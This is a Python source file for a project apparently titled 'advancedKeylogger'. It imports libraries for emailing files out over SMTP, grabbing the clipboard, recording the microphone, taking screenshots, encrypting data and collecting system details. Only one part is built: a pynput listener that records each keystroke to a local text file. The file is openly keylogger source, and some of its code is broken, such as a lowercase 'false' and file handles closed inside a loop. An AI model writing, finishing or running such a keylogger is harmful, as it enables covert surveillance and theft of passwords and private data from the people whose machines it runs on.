# libraries used
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

## to collect information
import socket
import platform

## getting the clipboard
import win32clipboard

## keystrokes get
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

# computer infromation
import getpass
from requests import get

# image grab and sscreenshot
from multiprocessing import Process, freeze_support

# from PIL import ImageGrab

# textfile
keys_infomration = "key_log.txt"
file_path = "C:\\Users\\karth\\PycharmProjects\\advancedKeylogger"
extend = "\\"  # to extend the file path to key info

count = 0;
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count > 0:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_infomration, "a") as f:
        for key in keys:
            # 'h''e' -> h e
            k = str(key).replace("'", "")
            # if space encountered then go to the next line
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            #avoiding keys like KEy.esc and Key.f1
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# basically releasing if key is pressed (esc key)
def on_release(key):
    if key == Key.esc:
        return false


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
